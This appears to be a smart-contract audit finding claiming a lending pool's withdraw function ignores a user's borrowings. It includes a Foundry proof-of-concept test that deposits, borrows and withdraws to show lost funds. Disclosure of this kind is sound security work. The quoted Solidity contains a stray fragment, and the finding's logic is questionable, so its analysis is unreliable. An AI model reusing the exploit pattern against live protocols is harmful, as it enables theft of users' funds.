# Pool::Withdraw seeks to withdraw the assets that was deposited without any significant check on the amount borrowed

### Summary

```
uint256 maxWithdrawAssets = pool.totalDepositAssets - pool.totalBorrowAssets; 12-3 9
uint256 totalBalance = IERC20(pool.asset).balanceOf(address(this));
maxWithdrawAssets = (totalBalance > maxWithdrawAssets) ? maxWithdrawAssets : totalBalance;
if (maxWithdrawAssets < assets) revert Pool_InsufficientWithdrawLiquidity(poolId, maxWithdrawAssets, assets);
```
`Pool::Withdraw` does not implement any significant checks to reduce the amount that a user has borrow. The above checks in the function only checks whether the amount to be withdrawn by a user is greater than what is available in the contract `if (maxWithdrawAssets < assets)`. 

The implication of this is that a user can steal funds from the protocol.

### Impact

Shortage of Funds in the contract/Loss of funds by the protocol and users.

### PoC

## POC 
```
     function test__POC() public {
        uint96 assets = 6 ether;
        //user2 makes deposits
        vm.startPrank(user2);
        asset1.mint(user2, assets);
        asset1.approve(address(pool), assets);
        pool.deposit(linearRatePool, assets, user2);
        vm.stopPrank();

        //user2 makes deposits
        vm.startPrank(user);
        asset1.mint(user, assets);
        asset1.approve(address(pool), assets);
        pool.deposit(linearRatePool, assets, user);
        vm.stopPrank();


        //borrow of 3 ether
        vm.prank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
        pool.borrow(linearRatePool, user, assets / 2);
            (,,,,,,, uint256 newTotalBorrowAssets, uint256 newTotalBorrowShares, uint256 totalDepositAssets ,) = pool.poolDataFor(linearRatePool);
        vm.warp(1000 days);
        vm.prank(user);
        pool.withdraw(linearRatePool, assets, user, user);

        assertEq(assets + (assets/2), asset1.balanceOf(user));
    }
```
The implication of this as seen from the above is the protocol would be in shortage of funds to settle user2.

### Mitigation

## Recommendation
There should be a system in place to tract users borrowings specifically and that the assets parameters in `Pool::Withdraw` is always reduces by that amount.
